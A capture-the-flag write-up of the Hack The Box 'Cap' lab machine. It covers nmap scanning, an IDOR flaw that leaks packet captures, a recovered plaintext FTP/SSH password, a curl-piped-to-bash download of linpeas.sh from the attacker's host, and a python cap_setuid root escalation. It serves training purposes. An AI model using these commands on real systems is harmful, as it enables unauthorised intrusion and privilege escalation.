---
tags:
  - type/literature
date & time: 17/08/2024 08:46
what: Write-up
which: Cap
where: HTB
---
We start by using nmap to scan open TCP ports

```bash
nmap -sC -sV -Pn -oA scan_result <target_ip>
```

`-sC`: This option runs a set of default scripts against the target. These scripts are part of the Nmap Scripting Engine (NSE) and are used to gather additional information about the target, such as detailed service versions, security vulnerabilities, and more.

`-sV`: This option enables version detection. Nmap will attempt to determine the version of the services running on open ports by sending probes and analyzing responses. This is useful for identifying the specific version of software (like a web server or database) running on the target.

`-Pn`: This option tells Nmap to skip the host discovery phase, where it would normally send pings to see if a host is up before scanning it. With `-Pn`, Nmap assumes the host is up and proceeds to scan it. This is useful when dealing with hosts that might block or not respond to ping requests.

`-oA scan_result`: This option saves the scan results in three different formats (normal, XML, and grepable) to files with the base name `scan_result`. The `-oA` option is shorthand for outputting in all formats (`-oN`, `-oX`, and `-oG`).

![[Pasted image 20240817083441.png]]

it shows that there are ==3== open TCP ports (21, 22 and 80) and those are FTP, SSH and HTTP ports.

The http service is ran by gumicorn, a python web server.

Then we try accessing the http service from web browser.

After accessing the /capture endpoint, we are served with /==data==/x where x is our capture id and it is sequential (incremented each time we access /capture).

This means that there are other results from past accesses of /capture, so we try to access them by decrementing the x. And ==yes==, we can get access to other user's scan result.

This vulnerability is called [[Insecure Direct Object References (IDOR)]] where you can access resources (unintended access) from the server with just referencing them in the URL.

After downloading and inspecting the ==0==.pcap file we follow the TCP streams, and find out about this particular stream:

![[Pasted image 20240817085510.png]]
We got nathan's ==FTP== password!

```
Buck3tH4TF0RM3!
```

We know that other than FTP and HTTP there's also SSH service on port 22, Let's try the credential we just got here.

![[Pasted image 20240817090947.png]]

We successfully logged-in via ==SSH== to Cap machine. To get the flag, cat the user.txt

```bash
cat user.txt
```

==`633a9f700ef95474d7f0de53957fcb32`==

Now to gain privilege escalation, we will use the linpeas.sh script. We run an HTTP server from our machine serving the linpeas.sh. We then curl the script from cap machine to our machine and pipe it to bash/shell:

on our machine:
```bash
mkdir www
cd www
cp /path/to/lineas.sh .
python3 -m http.server <port_number> # leave empty to use default port (8000)
```

![[Pasted image 20240817092756.png]]

on cap machine:
```bash
curl our_machine_ip:port/linpeas.sh | bash
```

Make sure that we're using IP provided by HTB's VPN. Wait for the script to finish executing.

Now we take a look at "Files with capabilities" section:

![[Pasted image 20240817093632.png]]

It appears that the binary file ==`/usr/bin/python3.8`== has a `cap_setuid` capability set, this allows the binary file to make arbitrary `setuid` or `setgid` system calls. This can be used to change the user ID or group ID of the process to 0 (root), effectively escalating our privileges. Now let's exploit this by opening python3.8

```bash
python3.8
```

and running this python script:

```python
import os
os.setuid(0) # Set process uid to root
os.system('/bin/bash') # Run bash shell as root
```

Now that we have a root shell, we can get the flag located in `/root`:

```bash
cat /root/root.txt
```

==5eeb384029737357182ea82bd258b47b==
